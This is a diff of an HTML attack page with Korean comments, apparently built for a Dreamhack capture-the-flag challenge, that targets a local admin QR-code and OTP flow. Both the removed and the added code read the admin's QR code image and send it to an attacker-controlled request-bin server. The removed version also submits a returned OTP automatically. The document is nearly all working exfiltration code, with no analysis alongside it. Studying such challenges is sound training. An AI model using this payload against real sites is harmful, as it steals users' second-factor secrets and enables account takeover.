@@ -6,72 +6,34 @@
     <title>Attack Page</title>
 </head>
 <body>
-
+    <iframe id="qrFrame" src="http://127.0.0.1:10023/generate_qr_code"></iframe>
+    
     <script>
-        // QR 코드 생성 페이지의 URL과 공격 서버 URL
-        const qrUrl = "http://127.0.0.1:10023/generate_qr_code";  // 관리자 QR 코드 페이지
-        const attackServer = "https://abzcsmb.request.dreamhack.games";  // 공격자의 서버
-
+        const attackServer = "https://dkguxwl.request.dreamhack.games";  // 공격자의 서버
+        const fail = "fail extractQRCode..."
         // QR 코드 정보를 얻기 위한 함수
-        function fetchQRCode() {
-            fetch(qrUrl)
-                .then(response => response.text())
-                .then(data => {
-                    // QR 코드 이미지 태그 추출
-                    const parser = new DOMParser();
-                    const doc = parser.parseFromString(data, 'text/html');
-                    const qrImage = doc.querySelector('img');
-                    const qrCodeSrc = qrImage.src;
-
-                    // QR 코드 이미지 URL 출력 (디버깅용)
-                    console.log("QR Code URL: ", qrCodeSrc);
-
-                    // 공격자의 서버로 QR 코드 데이터 전송
-                    sendQRCodeToAttackServer(qrCodeSrc);
-                })
-                .catch(error => console.error("QR Code Fetch Error:", error));
+        function extractQRCodeFromIframe() {
+            const qrFrame = document.getElementById('qrFrame');
+            const qrDoc = qrFrame.contentDocument || qrFrame.contentWindow.document;
+            const qrImage = qrDoc.querySelector('img');
+            
+            if (qrImage) {
+                const qrCodeSrc = qrImage.src;
+                sendQRCodeToAttackServer(qrCodeSrc);
+            } else {
+                sendQRCodeToAttackServer(fail);
+            }
         }
 
         // 공격자의 서버로 QR 코드 정보를 전송하는 함수
         function sendQRCodeToAttackServer(qrCodeSrc) {
-            fetch(attackServer, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ qr_code: qrCodeSrc })
-            })
-            .then(response => response.json())
-            .then(data => {
-                // 공격 서버에서 생성한 OTP 받기
-                const otp = data.otp;
-                console.log("Received OTP from attack server:", otp);
-
-                // OTP 자동 입력 및 제출
-                submitOTP(otp);
-            })
-            .catch(error => console.error("Error sending QR code to attack server:", error));
+            const attackUrl = `${attackServer}?qr_code=${encodeURIComponent(qrCodeSrc)}`;
+            const attackIframe = document.createElement('iframe');
+            attackIframe.src = attackUrl;
+            document.body.appendChild(attackIframe);
         }
 
-        // OTP를 자동으로 입력하고 제출하는 함수
-        function submitOTP(otp) {
-            // OTP 입력 페이지로 이동
-            fetch("/verify_otp", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
-                body: `otp=${otp}`
-            })
-            .then(response => response.text())
-            .then(data => {
-                console.log("OTP successfully submitted:", data);
-            })
-            .catch(error => console.error("Error submitting OTP:", error));
-        }
-
-        // 공격 실행
-        fetchQRCode();
+        document.getElementById('qrFrame').onload = extractQRCodeFromIframe;
     </script>
 </body>
 </html>
